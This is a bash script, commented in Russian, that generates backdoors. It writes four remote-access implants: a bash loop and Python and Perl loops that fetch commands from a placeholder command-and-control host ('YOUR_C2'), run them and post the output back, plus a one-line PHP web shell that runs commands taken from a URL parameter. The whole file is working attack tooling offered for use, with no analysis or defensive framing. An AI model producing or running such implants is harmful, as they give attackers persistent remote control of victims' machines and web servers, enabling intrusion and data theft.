#!/bin/bash
# Генератор бэкдоров — создаёт несколько вариантов для разных систем

OUT="$HOME/shadow_backdoors"
mkdir -p "$OUT"

echo "[BACKDOOR] Генерирую бэкдоры..."

# Bash
cat > "$OUT/backdoor.sh" << 'EOF'
#!/bin/bash
while true; do
    curl -sk https://YOUR_C2/cmd | bash
    sleep 60
done
EOF

# Python
cat > "$OUT/backdoor.py" << 'EOF'
import urllib.request, subprocess, time
while True:
    try:
        cmd = urllib.request.urlopen("https://YOUR_C2/cmd").read().decode()
        out = subprocess.getoutput(cmd)
        urllib.request.urlopen("https://YOUR_C2/log", data=out.encode()[:500])
    except: pass
    time.sleep(60)
EOF

# PHP
cat > "$OUT/backdoor.php" << 'EOF'
<?php system($_GET['cmd']); ?>
EOF

# Perl
cat > "$OUT/backdoor.pl" << 'EOF'
#!/usr/bin/perl
use LWP::Simple;
while(1) {
    my $cmd = get("https://YOUR_C2/cmd");
    my $out = `$cmd`;
    get("https://YOUR_C2/log?data=$out");
    sleep(60);
}
EOF

echo "[BACKDOOR] Создано: $OUT"
echo "  backdoor.sh   — Linux/Unix"
echo "  backdoor.py   — Python (кроссплатформа)"
echo "  backdoor.php  — Веб-сервер"
echo "  backdoor.pl   — Perl (старые системы)"
